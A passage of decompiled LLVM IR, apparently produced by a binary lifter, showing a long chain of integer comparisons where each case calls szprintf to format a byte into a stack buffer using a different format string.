  br i1 %v3_1000578c, label %dec_label_pc_10005794, label %dec_label_pc_100057dc

dec_label_pc_10005794:                            ; preds = %dec_label_pc_10005788
  %v2_10005794 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100057a8 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100057a8 = zext i8 %v3_100057a8 to i32
  %v4_100057d8 = call i32 @szprintf(i32 %v2_10005794, i32 ptrtoint ([12 x i8]* @global_var_10016a3c.166 to i32), i32 %v4_100057a8)
  br label %dec_label_pc_100057dc

dec_label_pc_100057dc:                            ; preds = %dec_label_pc_10005788, %dec_label_pc_10005794
  %v3_100057e0 = icmp eq i32 %v2_10002f1c, 124
  br i1 %v3_100057e0, label %dec_label_pc_100057e8, label %dec_label_pc_10005830

dec_label_pc_100057e8:                            ; preds = %dec_label_pc_100057dc
  %v2_100057e8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100057fc = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100057fc = zext i8 %v3_100057fc to i32
  %v4_1000582c = call i32 @szprintf(i32 %v2_100057e8, i32 ptrtoint ([14 x i8]* @global_var_10016a48.167 to i32), i32 %v4_100057fc)
  br label %dec_label_pc_10005830

dec_label_pc_10005830:                            ; preds = %dec_label_pc_100057dc, %dec_label_pc_100057e8
  %v3_10005834 = icmp eq i32 %v2_10002f1c, 125
  br i1 %v3_10005834, label %dec_label_pc_1000583c, label %dec_label_pc_10005884

dec_label_pc_1000583c:                            ; preds = %dec_label_pc_10005830
  %v2_1000583c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005850 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10005850 = zext i8 %v3_10005850 to i32
  %v4_10005880 = call i32 @szprintf(i32 %v2_1000583c, i32 ptrtoint ([14 x i8]* @global_var_10016a58.168 to i32), i32 %v4_10005850)
  br label %dec_label_pc_10005884

dec_label_pc_10005884:                            ; preds = %dec_label_pc_10005830, %dec_label_pc_1000583c
  %v3_10005888 = icmp eq i32 %v2_10002f1c, 126
  br i1 %v3_10005888, label %dec_label_pc_10005890, label %dec_label_pc_100058d8

dec_label_pc_10005890:                            ; preds = %dec_label_pc_10005884
  %v2_10005890 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100058a4 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100058a4 = zext i8 %v3_100058a4 to i32
  %v4_100058d4 = call i32 @szprintf(i32 %v2_10005890, i32 ptrtoint ([14 x i8]* @global_var_10016a48.167 to i32), i32 %v4_100058a4)
  br label %dec_label_pc_100058d8

dec_label_pc_100058d8:                            ; preds = %dec_label_pc_10005884, %dec_label_pc_10005890
  %v3_100058dc = icmp eq i32 %v2_10002f1c, 127
  br i1 %v3_100058dc, label %dec_label_pc_100058e4, label %dec_label_pc_1000592c

dec_label_pc_100058e4:                            ; preds = %dec_label_pc_100058d8
  %v2_100058e4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100058f8 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100058f8 = zext i8 %v3_100058f8 to i32
  %v4_10005928 = call i32 @szprintf(i32 %v2_100058e4, i32 ptrtoint ([14 x i8]* @global_var_10016a68.169 to i32), i32 %v4_100058f8)
  br label %dec_label_pc_1000592c

dec_label_pc_1000592c:                            ; preds = %dec_label_pc_100058d8, %dec_label_pc_100058e4
  %v3_10005930 = icmp eq i32 %v2_10002f1c, 128
  br i1 %v3_10005930, label %dec_label_pc_10005938, label %dec_label_pc_10005980

dec_label_pc_10005938:                            ; preds = %dec_label_pc_1000592c
  %v2_10005938 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000594c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_1000594c = zext i8 %v3_1000594c to i32
  %v4_1000597c = call i32 @szprintf(i32 %v2_10005938, i32 ptrtoint ([14 x i8]* @global_var_10016a78.170 to i32), i32 %v4_1000594c)
  br label %dec_label_pc_10005980

dec_label_pc_10005980:                            ; preds = %dec_label_pc_1000592c, %dec_label_pc_10005938
  %v3_10005984 = icmp eq i32 %v2_10002f1c, 129
  br i1 %v3_10005984, label %dec_label_pc_1000598c, label %dec_label_pc_100059d4

dec_label_pc_1000598c:                            ; preds = %dec_label_pc_10005980
  %v2_1000598c = ptrtoint i32* %stack_var_-52 to i32
  %v3_100059a0 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100059a0 = zext i8 %v3_100059a0 to i32
  %v4_100059d0 = call i32 @szprintf(i32 %v2_1000598c, i32 ptrtoint ([14 x i8]* @global_var_10016a88.171 to i32), i32 %v4_100059a0)
  br label %dec_label_pc_100059d4

dec_label_pc_100059d4:                            ; preds = %dec_label_pc_10005980, %dec_label_pc_1000598c
  %v3_100059d8 = icmp eq i32 %v2_10002f1c, 130
  br i1 %v3_100059d8, label %dec_label_pc_100059e0, label %dec_label_pc_10005a28

dec_label_pc_100059e0:                            ; preds = %dec_label_pc_100059d4
  %v2_100059e0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100059f4 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100059f4 = zext i8 %v3_100059f4 to i32
  %v4_10005a24 = call i32 @szprintf(i32 %v2_100059e0, i32 ptrtoint ([14 x i8]* @global_var_10016a98.172 to i32), i32 %v4_100059f4)
  br label %dec_label_pc_10005a28

dec_label_pc_10005a28:                            ; preds = %dec_label_pc_100059d4, %dec_label_pc_100059e0
  %v3_10005a2c = icmp eq i32 %v2_10002f1c, 131
  br i1 %v3_10005a2c, label %dec_label_pc_10005a34, label %dec_label_pc_10005a7c

dec_label_pc_10005a34:                            ; preds = %dec_label_pc_10005a28
  %v2_10005a34 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005a48 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10005a48 = zext i8 %v3_10005a48 to i32
  %v4_10005a78 = call i32 @szprintf(i32 %v2_10005a34, i32 ptrtoint ([14 x i8]* @global_var_10016aa8.173 to i32), i32 %v4_10005a48)
  br label %dec_label_pc_10005a7c

dec_label_pc_10005a7c:                            ; preds = %dec_label_pc_10005a28, %dec_label_pc_10005a34
  %v3_10005a80 = icmp eq i32 %v2_10002f1c, 132
  br i1 %v3_10005a80, label %dec_label_pc_10005a88, label %dec_label_pc_10005ad0

dec_label_pc_10005a88:                            ; preds = %dec_label_pc_10005a7c
  %v2_10005a88 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005a9c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10005a9c = zext i8 %v3_10005a9c to i32
  %v4_10005acc = call i32 @szprintf(i32 %v2_10005a88, i32 ptrtoint ([14 x i8]* @global_var_10016ab8.174 to i32), i32 %v4_10005a9c)
  br label %dec_label_pc_10005ad0

dec_label_pc_10005ad0:                            ; preds = %dec_label_pc_10005a7c, %dec_label_pc_10005a88
  %v3_10005ad4 = icmp eq i32 %v2_10002f1c, 133
  br i1 %v3_10005ad4, label %dec_label_pc_10005adc, label %dec_label_pc_10005b24

dec_label_pc_10005adc:                            ; preds = %dec_label_pc_10005ad0
  %v2_10005adc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005af0 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10005af0 = zext i8 %v3_10005af0 to i32
  %v4_10005b20 = call i32 @szprintf(i32 %v2_10005adc, i32 ptrtoint ([14 x i8]* @global_var_10016ac8.175 to i32), i32 %v4_10005af0)
  br label %dec_label_pc_10005b24

dec_label_pc_10005b24:                            ; preds = %dec_label_pc_10005ad0, %dec_label_pc_10005adc
  %v3_10005b28 = icmp eq i32 %v2_10002f1c, 134
  br i1 %v3_10005b28, label %dec_label_pc_10005b30, label %dec_label_pc_10005b78

dec_label_pc_10005b30:                            ; preds = %dec_label_pc_10005b24
  %v2_10005b30 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005b44 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10005b44 = zext i8 %v3_10005b44 to i32
  %v4_10005b74 = call i32 @szprintf(i32 %v2_10005b30, i32 ptrtoint ([14 x i8]* @global_var_10016ad8.176 to i32), i32 %v4_10005b44)
  br label %dec_label_pc_10005b78

dec_label_pc_10005b78:                            ; preds = %dec_label_pc_10005b24, %dec_label_pc_10005b30
  %v3_10005b7c = icmp eq i32 %v2_10002f1c, 135
  br i1 %v3_10005b7c, label %dec_label_pc_10005b84, label %dec_label_pc_10005bcc

dec_label_pc_10005b84:                            ; preds = %dec_label_pc_10005b78
  %v2_10005b84 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005b98 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10005b98 = zext i8 %v3_10005b98 to i32
  %v4_10005bc8 = call i32 @szprintf(i32 %v2_10005b84, i32 ptrtoint ([14 x i8]* @global_var_10016ae8.177 to i32), i32 %v4_10005b98)
  br label %dec_label_pc_10005bcc

dec_label_pc_10005bcc:                            ; preds = %dec_label_pc_10005b78, %dec_label_pc_10005b84
  %v3_10005bd0 = icmp eq i32 %v2_10002f1c, 136
  br i1 %v3_10005bd0, label %dec_label_pc_10005bd8, label %dec_label_pc_10005c20

dec_label_pc_10005bd8:                            ; preds = %dec_label_pc_10005bcc
  %v2_10005bd8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005bec = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10005bec = zext i8 %v3_10005bec to i32
  %v4_10005c1c = call i32 @szprintf(i32 %v2_10005bd8, i32 ptrtoint ([14 x i8]* @global_var_10016af8.178 to i32), i32 %v4_10005bec)
  br label %dec_label_pc_10005c20

dec_label_pc_10005c20:                            ; preds = %dec_label_pc_10005bcc, %dec_label_pc_10005bd8
  %v3_10005c24 = icmp eq i32 %v2_10002f1c, 137
  br i1 %v3_10005c24, label %dec_label_pc_10005c2c, label %dec_label_pc_10005c74

dec_label_pc_10005c2c:                            ; preds = %dec_label_pc_10005c20
  %v2_10005c2c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005c40 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10005c40 = zext i8 %v3_10005c40 to i32
  %v4_10005c70 = call i32 @szprintf(i32 %v2_10005c2c, i32 ptrtoint ([13 x i8]* @global_var_10016b08.179 to i32), i32 %v4_10005c40)
  br label %dec_label_pc_10005c74

dec_label_pc_10005c74:                            ; preds = %dec_label_pc_10005c20, %dec_label_pc_10005c2c
  %v3_10005c78 = icmp eq i32 %v2_10002f1c, 138
  br i1 %v3_10005c78, label %dec_label_pc_10005c80, label %dec_label_pc_10005cc8

dec_label_pc_10005c80:                            ; preds = %dec_label_pc_10005c74
  %v2_10005c80 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005c94 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10005c94 = zext i8 %v3_10005c94 to i32
  %v4_10005cc4 = call i32 @szprintf(i32 %v2_10005c80, i32 ptrtoint ([13 x i8]* @global_var_10016b18.180 to i32), i32 %v4_10005c94)
  br label %dec_label_pc_10005cc8

dec_label_pc_10005cc8:                            ; preds = %dec_label_pc_10005c74, %dec_label_pc_10005c80
  %v3_10005ccc = icmp eq i32 %v2_10002f1c, 139
  br i1 %v3_10005ccc, label %dec_label_pc_10005cd4, label %dec_label_pc_10005d1c

dec_label_pc_10005cd4:                            ; preds = %dec_label_pc_10005cc8
  %v2_10005cd4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005ce8 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10005ce8 = zext i8 %v3_10005ce8 to i32
  %v4_10005d18 = call i32 @szprintf(i32 %v2_10005cd4, i32 ptrtoint ([13 x i8]* @global_var_10016b28.181 to i32), i32 %v4_10005ce8)
  br label %dec_label_pc_10005d1c

dec_label_pc_10005d1c:                            ; preds = %dec_label_pc_10005cc8, %dec_label_pc_10005cd4
  %v3_10005d20 = icmp eq i32 %v2_10002f1c, 140
  br i1 %v3_10005d20, label %dec_label_pc_10005d28, label %dec_label_pc_10005d70

dec_label_pc_10005d28:                            ; preds = %dec_label_pc_10005d1c
  %v2_10005d28 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005d3c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10005d3c = zext i8 %v3_10005d3c to i32
  %v4_10005d6c = call i32 @szprintf(i32 %v2_10005d28, i32 ptrtoint ([13 x i8]* @global_var_10016b38.182 to i32), i32 %v4_10005d3c)
  br label %dec_label_pc_10005d70

dec_label_pc_10005d70:                            ; preds = %dec_label_pc_10005d1c, %dec_label_pc_10005d28
  %v3_10005d74 = icmp eq i32 %v2_10002f1c, 141
  br i1 %v3_10005d74, label %dec_label_pc_10005d7c, label %dec_label_pc_10005dc4

dec_label_pc_10005d7c:                            ; preds = %dec_label_pc_10005d70
  %v2_10005d7c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005d90 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10005d90 = zext i8 %v3_10005d90 to i32
  %v4_10005dc0 = call i32 @szprintf(i32 %v2_10005d7c, i32 ptrtoint ([13 x i8]* @global_var_10016b48.183 to i32), i32 %v4_10005d90)
  br label %dec_label_pc_10005dc4

dec_label_pc_10005dc4:                            ; preds = %dec_label_pc_10005d70, %dec_label_pc_10005d7c
  %v3_10005dc8 = icmp eq i32 %v2_10002f1c, 142
  br i1 %v3_10005dc8, label %dec_label_pc_10005dd0, label %dec_label_pc_10005e18

dec_label_pc_10005dd0:                            ; preds = %dec_label_pc_10005dc4
  %v2_10005dd0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005de4 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10005de4 = zext i8 %v3_10005de4 to i32
  %v4_10005e14 = call i32 @szprintf(i32 %v2_10005dd0, i32 ptrtoint ([13 x i8]* @global_var_10016b58.184 to i32), i32 %v4_10005de4)
  br label %dec_label_pc_10005e18

dec_label_pc_10005e18:                            ; preds = %dec_label_pc_10005dc4, %dec_label_pc_10005dd0
  %v3_10005e1c = icmp eq i32 %v2_10002f1c, 143
  br i1 %v3_10005e1c, label %dec_label_pc_10005e24, label %dec_label_pc_10005e6c

dec_label_pc_10005e24:                            ; preds = %dec_label_pc_10005e18
  %v2_10005e24 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005e38 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10005e38 = zext i8 %v3_10005e38 to i32
  %v4_10005e68 = call i32 @szprintf(i32 %v2_10005e24, i32 ptrtoint ([14 x i8]* @global_var_10016a48.167 to i32), i32 %v4_10005e38)
  br label %dec_label_pc_10005e6c

dec_label_pc_10005e6c:                            ; preds = %dec_label_pc_10005e18, %dec_label_pc_10005e24
  %v3_10005e70 = icmp eq i32 %v2_10002f1c, 144
  br i1 %v3_10005e70, label %dec_label_pc_10005e78, label %dec_label_pc_10005ec0

dec_label_pc_10005e78:                            ; preds = %dec_label_pc_10005e6c
  %v2_10005e78 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005e8c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10005e8c = zext i8 %v3_10005e8c to i32
  %v4_10005ebc = call i32 @szprintf(i32 %v2_10005e78, i32 ptrtoint ([14 x i8]* @global_var_10016b68.185 to i32), i32 %v4_10005e8c)
  br label %dec_label_pc_10005ec0

dec_label_pc_10005ec0:                            ; preds = %dec_label_pc_10005e6c, %dec_label_pc_10005e78
  %v3_10005ec4 = icmp eq i32 %v2_10002f1c, 145
  br i1 %v3_10005ec4, label %dec_label_pc_10005ecc, label %dec_label_pc_10005f14

dec_label_pc_10005ecc:                            ; preds = %dec_label_pc_10005ec0
  %v2_10005ecc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005ee0 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10005ee0 = zext i8 %v3_10005ee0 to i32
  %v4_10005f10 = call i32 @szprintf(i32 %v2_10005ecc, i32 ptrtoint ([14 x i8]* @global_var_10016b78.186 to i32), i32 %v4_10005ee0)
  br label %dec_label_pc_10005f14

dec_label_pc_10005f14:                            ; preds = %dec_label_pc_10005ec0, %dec_label_pc_10005ecc
  %v3_10005f18 = icmp eq i32 %v2_10002f1c, 146
  br i1 %v3_10005f18, label %dec_label_pc_10005f20, label %dec_label_pc_10005f68

dec_label_pc_10005f20:                            ; preds = %dec_label_pc_10005f14
  %v2_10005f20 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005f34 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10005f34 = zext i8 %v3_10005f34 to i32
  %v4_10005f64 = call i32 @szprintf(i32 %v2_10005f20, i32 ptrtoint ([14 x i8]* @global_var_10016b88.187 to i32), i32 %v4_10005f34)
  br label %dec_label_pc_10005f68

dec_label_pc_10005f68:                            ; preds = %dec_label_pc_10005f14, %dec_label_pc_10005f20
  %v3_10005f6c = icmp eq i32 %v2_10002f1c, 147
  br i1 %v3_10005f6c, label %dec_label_pc_10005f74, label %dec_label_pc_10005fbc

dec_label_pc_10005f74:                            ; preds = %dec_label_pc_10005f68
  %v2_10005f74 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005f88 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10005f88 = zext i8 %v3_10005f88 to i32
  %v4_10005fb8 = call i32 @szprintf(i32 %v2_10005f74, i32 ptrtoint ([13 x i8]* @global_var_10016b98.188 to i32), i32 %v4_10005f88)
  br label %dec_label_pc_10005fbc

dec_label_pc_10005fbc:                            ; preds = %dec_label_pc_10005f68, %dec_label_pc_10005f74
  %v3_10005fc0 = icmp eq i32 %v2_10002f1c, 148
  br i1 %v3_10005fc0, label %dec_label_pc_10005fc8, label %dec_label_pc_10006010

dec_label_pc_10005fc8:                            ; preds = %dec_label_pc_10005fbc
  %v2_10005fc8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005fdc = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10005fdc = zext i8 %v3_10005fdc to i32
  %v4_1000600c = call i32 @szprintf(i32 %v2_10005fc8, i32 ptrtoint ([13 x i8]* @global_var_10016ba8.189 to i32), i32 %v4_10005fdc)
  br label %dec_label_pc_10006010

dec_label_pc_10006010:                            ; preds = %dec_label_pc_10005fbc, %dec_label_pc_10005fc8
  %v3_10006014 = icmp eq i32 %v2_10002f1c, 149
  br i1 %v3_10006014, label %dec_label_pc_1000601c, label %dec_label_pc_10006064

dec_label_pc_1000601c:                            ; preds = %dec_label_pc_10006010
  %v2_1000601c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006030 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006030 = zext i8 %v3_10006030 to i32
  %v4_10006060 = call i32 @szprintf(i32 %v2_1000601c, i32 ptrtoint ([14 x i8]* @global_var_10016bb8.190 to i32), i32 %v4_10006030)
  br label %dec_label_pc_10006064

dec_label_pc_10006064:                            ; preds = %dec_label_pc_10006010, %dec_label_pc_1000601c
  %v3_10006068 = icmp eq i32 %v2_10002f1c, 150
  br i1 %v3_10006068, label %dec_label_pc_10006070, label %dec_label_pc_100060b8

dec_label_pc_10006070:                            ; preds = %dec_label_pc_10006064
  %v2_10006070 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006084 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006084 = zext i8 %v3_10006084 to i32
  %v4_100060b4 = call i32 @szprintf(i32 %v2_10006070, i32 ptrtoint ([14 x i8]* @global_var_10016bc8.191 to i32), i32 %v4_10006084)
  br label %dec_label_pc_100060b8

dec_label_pc_100060b8:                            ; preds = %dec_label_pc_10006064, %dec_label_pc_10006070
  %v3_100060bc = icmp eq i32 %v2_10002f1c, 151
  br i1 %v3_100060bc, label %dec_label_pc_100060c4, label %dec_label_pc_1000610c

dec_label_pc_100060c4:                            ; preds = %dec_label_pc_100060b8
  %v2_100060c4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100060d8 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100060d8 = zext i8 %v3_100060d8 to i32
  %v4_10006108 = call i32 @szprintf(i32 %v2_100060c4, i32 ptrtoint ([14 x i8]* @global_var_10016bd8.192 to i32), i32 %v4_100060d8)
  br label %dec_label_pc_1000610c

dec_label_pc_1000610c:                            ; preds = %dec_label_pc_100060b8, %dec_label_pc_100060c4
  %v3_10006110 = icmp eq i32 %v2_10002f1c, 152
  br i1 %v3_10006110, label %dec_label_pc_10006118, label %dec_label_pc_10006160

dec_label_pc_10006118:                            ; preds = %dec_label_pc_1000610c
  %v2_10006118 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000612c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_1000612c = zext i8 %v3_1000612c to i32
  %v4_1000615c = call i32 @szprintf(i32 %v2_10006118, i32 ptrtoint ([14 x i8]* @global_var_100169bc.158 to i32), i32 %v4_1000612c)
  br label %dec_label_pc_10006160

dec_label_pc_10006160:                            ; preds = %dec_label_pc_1000610c, %dec_label_pc_10006118
  %v3_10006164 = icmp eq i32 %v2_10002f1c, 153
  br i1 %v3_10006164, label %dec_label_pc_1000616c, label %dec_label_pc_100061b4

dec_label_pc_1000616c:                            ; preds = %dec_label_pc_10006160
  %v2_1000616c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006180 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006180 = zext i8 %v3_10006180 to i32
  %v4_100061b0 = call i32 @szprintf(i32 %v2_1000616c, i32 ptrtoint ([13 x i8]* @global_var_10016be8.193 to i32), i32 %v4_10006180)
  br label %dec_label_pc_100061b4

dec_label_pc_100061b4:                            ; preds = %dec_label_pc_10006160, %dec_label_pc_1000616c
  %v3_100061b8 = icmp eq i32 %v2_10002f1c, 154
  br i1 %v3_100061b8, label %dec_label_pc_100061c0, label %dec_label_pc_10006208

dec_label_pc_100061c0:                            ; preds = %dec_label_pc_100061b4
  %v2_100061c0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100061d4 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100061d4 = zext i8 %v3_100061d4 to i32
  %v4_10006204 = call i32 @szprintf(i32 %v2_100061c0, i32 ptrtoint ([13 x i8]* @global_var_10016bf8.194 to i32), i32 %v4_100061d4)
  br label %dec_label_pc_10006208

dec_label_pc_10006208:                            ; preds = %dec_label_pc_100061b4, %dec_label_pc_100061c0
  %v3_1000620c = icmp eq i32 %v2_10002f1c, 155
  br i1 %v3_1000620c, label %dec_label_pc_10006214, label %dec_label_pc_1000625c

dec_label_pc_10006214:                            ; preds = %dec_label_pc_10006208
  %v2_10006214 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006228 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006228 = zext i8 %v3_10006228 to i32
  %v4_10006258 = call i32 @szprintf(i32 %v2_10006214, i32 ptrtoint ([13 x i8]* @global_var_10016c08.195 to i32), i32 %v4_10006228)
  br label %dec_label_pc_1000625c

dec_label_pc_1000625c:                            ; preds = %dec_label_pc_10006208, %dec_label_pc_10006214
  %v3_10006260 = icmp eq i32 %v2_10002f1c, 156
  br i1 %v3_10006260, label %dec_label_pc_10006268, label %dec_label_pc_100062b0

dec_label_pc_10006268:                            ; preds = %dec_label_pc_1000625c
  %v2_10006268 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000627c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_1000627c = zext i8 %v3_1000627c to i32
  %v4_100062ac = call i32 @szprintf(i32 %v2_10006268, i32 ptrtoint ([13 x i8]* @global_var_10016c18.196 to i32), i32 %v4_1000627c)
  br label %dec_label_pc_100062b0

dec_label_pc_100062b0:                            ; preds = %dec_label_pc_1000625c, %dec_label_pc_10006268
  %v3_100062b4 = icmp eq i32 %v2_10002f1c, 157
  br i1 %v3_100062b4, label %dec_label_pc_100062bc, label %dec_label_pc_10006304

dec_label_pc_100062bc:                            ; preds = %dec_label_pc_100062b0
  %v2_100062bc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100062d0 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100062d0 = zext i8 %v3_100062d0 to i32
  %v4_10006300 = call i32 @szprintf(i32 %v2_100062bc, i32 ptrtoint ([13 x i8]* @global_var_10016c28.197 to i32), i32 %v4_100062d0)
  br label %dec_label_pc_10006304

dec_label_pc_10006304:                            ; preds = %dec_label_pc_100062b0, %dec_label_pc_100062bc
  %v3_10006308 = icmp eq i32 %v2_10002f1c, 158
  br i1 %v3_10006308, label %dec_label_pc_10006310, label %dec_label_pc_10006358

dec_label_pc_10006310:                            ; preds = %dec_label_pc_10006304
  %v2_10006310 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006324 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006324 = zext i8 %v3_10006324 to i32
  %v4_10006354 = call i32 @szprintf(i32 %v2_10006310, i32 ptrtoint ([12 x i8]* @global_var_10016c38.198 to i32), i32 %v4_10006324)
  br label %dec_label_pc_10006358

dec_label_pc_10006358:                            ; preds = %dec_label_pc_10006304, %dec_label_pc_10006310
  %v3_1000635c = icmp eq i32 %v2_10002f1c, 159
  br i1 %v3_1000635c, label %dec_label_pc_10006364, label %dec_label_pc_100063ac

dec_label_pc_10006364:                            ; preds = %dec_label_pc_10006358
  %v2_10006364 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006378 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006378 = zext i8 %v3_10006378 to i32
  %v4_100063a8 = call i32 @szprintf(i32 %v2_10006364, i32 ptrtoint ([14 x i8]* @global_var_10016c44.199 to i32), i32 %v4_10006378)
  br label %dec_label_pc_100063ac

dec_label_pc_100063ac:                            ; preds = %dec_label_pc_10006358, %dec_label_pc_10006364
  %v3_100063b0 = icmp eq i32 %v2_10002f1c, 160
  br i1 %v3_100063b0, label %dec_label_pc_100063b8, label %dec_label_pc_10006400

dec_label_pc_100063b8:                            ; preds = %dec_label_pc_100063ac
  %v2_100063b8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100063cc = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100063cc = zext i8 %v3_100063cc to i32
  %v4_100063fc = call i32 @szprintf(i32 %v2_100063b8, i32 ptrtoint ([13 x i8]* @global_var_10016c54.200 to i32), i32 %v4_100063cc)
  br label %dec_label_pc_10006400

dec_label_pc_10006400:                            ; preds = %dec_label_pc_100063ac, %dec_label_pc_100063b8
  %v3_10006404 = icmp eq i32 %v2_10002f1c, 161
  br i1 %v3_10006404, label %dec_label_pc_1000640c, label %dec_label_pc_10006454

dec_label_pc_1000640c:                            ; preds = %dec_label_pc_10006400
  %v2_1000640c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006420 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006420 = zext i8 %v3_10006420 to i32
  %v4_10006450 = call i32 @szprintf(i32 %v2_1000640c, i32 ptrtoint ([14 x i8]* @global_var_10016c64.201 to i32), i32 %v4_10006420)
  br label %dec_label_pc_10006454

dec_label_pc_10006454:                            ; preds = %dec_label_pc_10006400, %dec_label_pc_1000640c
  %v3_10006458 = icmp eq i32 %v2_10002f1c, 162
  br i1 %v3_10006458, label %dec_label_pc_10006460, label %dec_label_pc_100064a8

dec_label_pc_10006460:                            ; preds = %dec_label_pc_10006454
  %v2_10006460 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006474 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006474 = zext i8 %v3_10006474 to i32
  %v4_100064a4 = call i32 @szprintf(i32 %v2_10006460, i32 ptrtoint ([14 x i8]* @global_var_10016c74.202 to i32), i32 %v4_10006474)
  br label %dec_label_pc_100064a8

dec_label_pc_100064a8:                            ; preds = %dec_label_pc_10006454, %dec_label_pc_10006460
  %v3_100064ac = icmp eq i32 %v2_10002f1c, 163
  br i1 %v3_100064ac, label %dec_label_pc_100064b4, label %dec_label_pc_100064fc

dec_label_pc_100064b4:                            ; preds = %dec_label_pc_100064a8
  %v2_100064b4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100064c8 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_100064c8 = zext i8 %v3_100064c8 to i32
  %v4_100064f8 = call i32 @szprintf(i32 %v2_100064b4, i32 ptrtoint ([14 x i8]* @global_var_10016c84.203 to i32), i32 %v4_100064c8)
  br label %dec_label_pc_100064fc

dec_label_pc_100064fc:                            ; preds = %dec_label_pc_100064a8, %dec_label_pc_100064b4
  %v3_10006500 = icmp eq i32 %v2_10002f1c, 164
  br i1 %v3_10006500, label %dec_label_pc_10006508, label %dec_label_pc_10006550

dec_label_pc_10006508:                            ; preds = %dec_label_pc_100064fc
  %v2_10006508 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000651c = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_1000651c = zext i8 %v3_1000651c to i32
  %v4_1000654c = call i32 @szprintf(i32 %v2_10006508, i32 ptrtoint ([14 x i8]* @global_var_10016bd8.192 to i32), i32 %v4_1000651c)
  br label %dec_label_pc_10006550

dec_label_pc_10006550:                            ; preds = %dec_label_pc_100064fc, %dec_label_pc_10006508
  %v3_10006554 = icmp eq i32 %v2_10002f1c, 165
  br i1 %v3_10006554, label %dec_label_pc_1000655c, label %dec_label_pc_100065a4

dec_label_pc_1000655c:                            ; preds = %dec_label_pc_10006550
  %v2_1000655c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006570 = load i8, i8* @global_var_1002abc3.46, align 1
  %v4_10006570 = zext i8 %v3_10006570 to i32
  %v4_100065a0 = call i32 @szprintf(i32 %v2_1000655c, i32 ptrtoint ([13 x i8]* @global_var_10016c94.204 to i32), i32 %v4_10006570)
  br label %dec_label_pc_100065a4

dec_label_pc_100065a4:                            ; preds = %dec_label_pc_10006550, %dec_label_pc_1000655c
